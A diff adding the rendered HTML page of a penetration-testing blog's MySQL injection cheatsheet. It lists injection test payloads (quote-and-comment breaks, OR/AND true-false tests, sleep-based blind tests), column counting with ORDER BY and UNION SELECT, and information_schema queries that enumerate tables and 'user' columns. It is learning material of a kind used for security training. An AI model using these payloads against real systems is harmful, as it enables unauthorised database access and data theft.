@@ -1,0 +1,864 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang='en-us'><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>MySQL Injection Cheatsheet - Welcome to noobsec</title>
+
+    
+
+    
+
+    
+    <meta name="author" content="karan bhayani" />
+    
+
+    
+        <meta property="og:title" content="MySQL Injection Cheatsheet" />
+<meta property="og:description" content="MySQL Injection cheatsheet Testing checklist Name Character Function Single quote &#39; String terminator Semi colon ; Query terminator Comment -- - Removes the rest of the query Comment # Removes the rest of the query Comment /*comment this*/ Can be placed anywhere in a query, used for bypassing weak filters Single quote with a comment &#39;-- - End a string and remove rest of the query Single quote, semi colon and a comment &#39;;-- - End a string, end query, and remove rest of the query OR operator OR 1=1-- - For integers, true test OR operator OR 1=2-- - For integers, false test OR operator &#39; OR &#39;1&#39;=&#39;1&#39;-- - For strings, test test AND operator AND 1=1-- - For integers, true test AND operator AND 1=2-- - For integers, false test AND operator &#39; AND &#39;1&#39;=&#39;1&#39;-- - For strings, true test Arithmetic ?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/sqli-cheatsheet/" /><meta property="article:section" content="" />
+<meta property="article:published_time" content="2020-07-29T13:10:00+00:00" />
+<meta property="article:modified_time" content="2020-07-29T13:10:00+00:00" />
+
+
+    
+
+    
+        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="MySQL Injection Cheatsheet"/>
+<meta name="twitter:description" content="MySQL Injection cheatsheet Testing checklist Name Character Function Single quote &#39; String terminator Semi colon ; Query terminator Comment -- - Removes the rest of the query Comment # Removes the rest of the query Comment /*comment this*/ Can be placed anywhere in a query, used for bypassing weak filters Single quote with a comment &#39;-- - End a string and remove rest of the query Single quote, semi colon and a comment &#39;;-- - End a string, end query, and remove rest of the query OR operator OR 1=1-- - For integers, true test OR operator OR 1=2-- - For integers, false test OR operator &#39; OR &#39;1&#39;=&#39;1&#39;-- - For strings, test test AND operator AND 1=1-- - For integers, true test AND operator AND 1=2-- - For integers, false test AND operator &#39; AND &#39;1&#39;=&#39;1&#39;-- - For strings, true test Arithmetic ?"/>
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+        
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-171056200-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'light';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en-us.js" integrity=""></script>
+
+
+
+
+
+</head>
+<body>
+        <main><header>
+    <div class="brand">
+        <div id="sidebar_btn">
+            <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+        </div>
+
+        <div>
+            <a href="/">noobsec</a>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">OSCP</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">OSCP AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-journey" class="pure-menu-link">OSCP Journey</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/bof" class="pure-menu-link">OSCP BOF</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">HTB</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bart" class="pure-menu-link">HTB Bart</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit" class="pure-menu-link">HTB Falafel</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-cronos" class="pure-menu-link">HTB Cronos</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-bashed" class="pure-menu-link">HTB Bashed</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/hackthebox/htb-lame" class="pure-menu-link">HTB Lame</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Web Attacks</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/file-inclusion" class="pure-menu-link">File Inclusion</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x01" class="pure-menu-link">SQLi 0x01</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x02" class="pure-menu-link">SQLi 0x02</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-0x03" class="pure-menu-link">SQLi 0x03</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item navbar-dropdown pure-menu-item pure-menu-has-children pure-menu-allow-hover ">
+                    
+                        <a href="#" class="pure-menu-link">Cheatsheets</a>
+                    
+                    <ul class="pure-menu-children">
+    
+        <li class="pure-menu-item">
+            
+                <a href="/oscp-cheatsheet" class="pure-menu-link">OSCP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-linux" class="pure-menu-link">Linux PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/privesc-windows" class="pure-menu-link">Windows PrivEsc Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/ad-cheatsheet" class="pure-menu-link">AD Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/crtp-cheatsheet" class="pure-menu-link">CRTP Cheatsheet</a>
+            
+        </li>
+    
+
+    
+        <li class="pure-menu-item">
+            
+                <a href="/sqli-cheatsheet" class="pure-menu-link">SQLi Cheatsheet</a>
+            
+        </li>
+    
+
+</ul>
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/starting-point" class="pure-menu-link">Getting Started in Red Team</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/whoami/" class="pure-menu-link">About</a>
+                    
+                </li></ul>
+</nav>
+<div id="sidebar_canvas_overlay" class="hidden"></div>
+<div id="sidebar" class="close">
+    <ul><li>
+                    <details>
+                        <summary><a href="#">OSCP</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">OSCP AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/oscp-journey">OSCP Journey</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/bof">OSCP BOF</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">HTB</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bart">HTB Bart</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-falafel-writeup-w-o-metasploit">HTB Falafel</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-cronos">HTB Cronos</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-bashed">HTB Bashed</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/hackthebox/htb-lame">HTB Lame</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Web Attacks</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/file-inclusion">File Inclusion</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x01">SQLi 0x01</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x02">SQLi 0x02</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-0x03">SQLi 0x03</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <details>
+                        <summary><a href="#">Cheatsheets</a></summary>
+    <ul>
+        
+            
+                <li>
+                    
+                        <a href="/oscp-cheatsheet">OSCP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-linux">Linux PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/privesc-windows">Windows PrivEsc Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/ad-cheatsheet">AD Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/crtp-cheatsheet">CRTP Cheatsheet</a>
+                    
+                </li>
+            
+        
+            
+                <li>
+                    
+                        <a href="/sqli-cheatsheet">SQLi Cheatsheet</a>
+                    
+                </li>
+            
+        
+    </ul>
+</details>
+                </li><li>
+                    <a href="/starting-point">Getting Started in Red Team</a>
+                </li><li>
+                    <a href="/whoami/">About</a>
+                </li></ul>
+</div><div id="content" class="content-margin">
+                
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#testing-checklist">Testing checklist</a></li>
+    <li><a href="#functions">Functions</a></li>
+    <li><a href="#number-of-columns">Number of Columns</a></li>
+    <li><a href="#database-contents">Database Contents</a></li>
+    <li><a href="#wildcards">Wildcards:</a></li>
+    <li><a href="#fin">Fin</a></li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    <h1 id="mysql-injection-cheatsheet">MySQL Injection cheatsheet</h1>
+<h2 id="testing-checklist">Testing checklist</h2>
+<table class="mc-table">
+<thead>
+<tr>
+<th>Name</th>
+<th>Character</th>
+<th>Function</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Single quote</td>
+<td><code>'</code></td>
+<td>String terminator</td>
+</tr>
+<tr>
+<td>Semi colon</td>
+<td><code>;</code></td>
+<td>Query terminator</td>
+</tr>
+<tr>
+<td>Comment</td>
+<td><code>-- -</code></td>
+<td>Removes the rest of the query</td>
+</tr>
+<tr>
+<td>Comment</td>
+<td><code>#</code></td>
+<td>Removes the rest of the query</td>
+</tr>
+<tr>
+<td>Comment</td>
+<td><code>/*comment this*/</code></td>
+<td>Can be placed anywhere in a query, used for bypassing weak filters</td>
+</tr>
+<tr>
+<td>Single quote with a comment</td>
+<td><code>'-- -</code></td>
+<td>End a string and remove rest of the query</td>
+</tr>
+<tr>
+<td>Single quote, semi colon and a comment</td>
+<td><code>';-- -</code></td>
+<td>End a string, end query, and remove rest of the query</td>
+</tr>
+<tr>
+<td>OR operator</td>
+<td><code>OR 1=1-- -</code></td>
+<td>For integers, <code>true</code> test</td>
+</tr>
+<tr>
+<td>OR operator</td>
+<td><code>OR 1=2-- -</code></td>
+<td>For integers, <code>false</code> test</td>
+</tr>
+<tr>
+<td>OR operator</td>
+<td><code>' OR '1'='1'-- -</code></td>
+<td>For strings, <code>test</code> test</td>
+</tr>
+<tr>
+<td>AND operator</td>
+<td><code>AND 1=1-- -</code></td>
+<td>For integers, <code>true</code> test</td>
+</tr>
+<tr>
+<td>AND operator</td>
+<td><code>AND 1=2-- -</code></td>
+<td>For integers, <code>false</code> test</td>
+</tr>
+<tr>
+<td>AND operator</td>
+<td><code>' AND '1'='1'-- -</code></td>
+<td>For strings, <code>true</code> test</td>
+</tr>
+<tr>
+<td>Arithmetic</td>
+<td><code>?id=2-1</code></td>
+<td>For integers, arithmetic operation would load the resultant post</td>
+</tr>
+<tr>
+<td>Sleep function</td>
+<td><code>OR sleep(5)-- -</code></td>
+<td>Blind test</td>
+</tr>
+</tbody>
+</table>
+<h2 id="functions">Functions</h2>
+<table class="mc-table">
+<thead>
+<tr>
+<th>Function</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>database()</code></td>
+<td>Get the name of the working database</td>
+</tr>
+<tr>
+<td><code>user()</code></td>
+<td>Get the name of the user operating on the working database</td>
+</tr>
+<tr>
+<td><code>version()</code></td>
+<td>MySQL version</td>
+</tr>
+<tr>
+<td><code>concat()</code></td>
+<td>Concatenate two or more strings per row</td>
+</tr>
+<tr>
+<td><code>group_concat()</code></td>
+<td>Concatenate all the strings in one row</td>
+</tr>
+<tr>
+<td><code>substring('string'/&lt;column_name&gt;,&lt;offset&gt;,&lt;length&gt;)</code></td>
+<td>Get a part of the value of a string or column</td>
+</tr>
+<tr>
+<td><code>ord()</code></td>
+<td>Convert the value to ordinal (decimal)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="number-of-columns">Number of Columns</h2>
+<table class="mc-table">
+<thead>
+<tr>
+<th>Method</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ORDER BY 3-- -</code></td>
+<td>For numbers. If column index provided exceeds the number of column present in the table, there will be an error</td>
+</tr>
+<tr>
+<td><code>' ORDER BY 3-- -</code></td>
+<td>For string. If column index provided exceeds the number of column present in the table, there will be an error</td>
+</tr>
+<tr>
+<td><code> UNION SELECT 1,2,3-- -</code></td>
+<td>For numbers. It will throw an error till right number of columns haven&rsquo;t been &ldquo;SELECT&quot;ed</td>
+</tr>
+</tbody>
+</table>
+<h2 id="database-contents">Database Contents</h2>
+<p><em>Works with UNION queries</em></p>
+<p>Get the tables present in your working database:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT table_name FROM information_schema.tables WHERE table_schema=database()
+</code></pre>
+<p>Once you get the tables, you can get the columns from those tables:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT column_name FROM information_schema.columns WHERE table_name='x'
+</code></pre>
+<h2 id="wildcards">Wildcards:</h2>
+<p>Get any table which consists the term &ldquo;user&rdquo; anywhere:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT table_name FROM information_schema.tables WHERE table_name like %user%
+</code></pre>
+<p>Get any column which consists the term &ldquo;user&rdquo; in it:</p>
+<pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT column_name FROM information_schema.columns WHERE column_name like %user%;
+
+/* Get columns along with its respective tables */
+SELECT GROUP_CONCAT(column_name,0x3a,table_name,'\r\n') FROM information_schema.columns WHERE column_name like %user%;
+</code></pre>
+<h2 id="fin">Fin</h2>
+<p>If you found some mistake, or would like me to add something, feel free to contact me :)</p>
+<p>Other DB SQL injection cheatsheets will be added soon.</p>
+
+</article>
+</div>
+
+
+                
+                    <div class="content-margin">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "n00bsec" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+                
+            </div>
+<footer>
+    <article>Made with love...and copious amounts of coffee</article>
+</footer>
+
+</main>
+    </body>
+</html>
